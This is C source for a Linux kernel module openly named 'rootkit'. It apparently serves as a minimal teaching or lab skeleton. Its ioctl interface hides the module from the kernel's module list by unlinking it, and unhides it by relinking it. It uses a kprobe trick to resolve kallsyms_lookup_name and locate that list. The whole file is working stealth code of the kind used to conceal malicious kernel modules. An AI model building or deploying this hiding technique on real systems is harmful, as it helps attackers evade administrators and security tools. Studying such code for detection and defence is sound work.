#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/cdev.h>
#include <linux/rculist.h>
#include "rootkit.h"

#define OURMODNAME	"rootkit"

MODULE_AUTHOR("rhythm");
MODULE_DESCRIPTION("rootkit");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int major;
static struct class *cls;
static struct cdev *kernel_cdev;
static dev_t dev_no, dev;
static unsigned long val = 0xAAAA;

static void * find_symbol_by_name(const char *str) {
	static struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name"
	};

	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
	return (void *)kallsyms_lookup_name(str);
}

static int rootkit_open(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp) {
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
		unsigned long arg)
{
	void *list_ptr = find_symbol_by_name("modules");
	printk(KERN_INFO "%s\n", __func__);

	switch (ioctl) {
	case ROOTKIT_GET_VAL:
		if (copy_to_user((unsigned long * __user)arg, &val, sizeof(val))) {
			printk(KERN_INFO "copy_to_user failed!\n");
		}
		printk(KERN_INFO "GET_VAL, %lx\n", val);
		break;
	case ROOTKIT_SET_VAL:
		if (copy_from_user(&val, (unsigned long * __user)arg, sizeof(val))) {
			printk(KERN_INFO "copy_from_user failed!\n");
		}
		printk(KERN_INFO "SET_VAL, %lx\n", val);
		break;
	case ROOTKIT_HIDE:
		printk(KERN_INFO "rootkit HIDE\n");
		list_del_rcu(&THIS_MODULE->list);
		synchronize_rcu();
		break;
	case ROOTKIT_UNHIDE:
		printk(KERN_INFO "rootkit UNHIDE, %px\n", list_ptr);
		list_add_rcu(&THIS_MODULE->list, list_ptr);
		synchronize_rcu();
		break;
	}

	return 0;
}

struct file_operations fops = {
	open:		rootkit_open,
	unlocked_ioctl:	rootkit_ioctl,
	release:	rootkit_release,
	owner:		THIS_MODULE
};

static int __init rootkit_init(void)
{
	int ret;

	ret = alloc_chrdev_region(&dev_no , 0, 1, "rootkit");

	if (ret < 0) {
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	printk("The major number for your device is %d\n", major);

	kernel_cdev = cdev_alloc();
	cdev_init(kernel_cdev, &fops);
	kernel_cdev->owner = THIS_MODULE;
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0)
	{
		pr_info(KERN_INFO "unable to add cdev");
		return ret;
	}
	cls = class_create(OURMODNAME);
	// ignore returned device pointer for simplicity
	device_create(cls, NULL, dev, NULL, OURMODNAME);
	return 0;
}

static void __exit rootkit_exit(void)
{
	pr_info("%s: removed\n", OURMODNAME);
	device_destroy(cls, dev);
	class_destroy(cls);
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
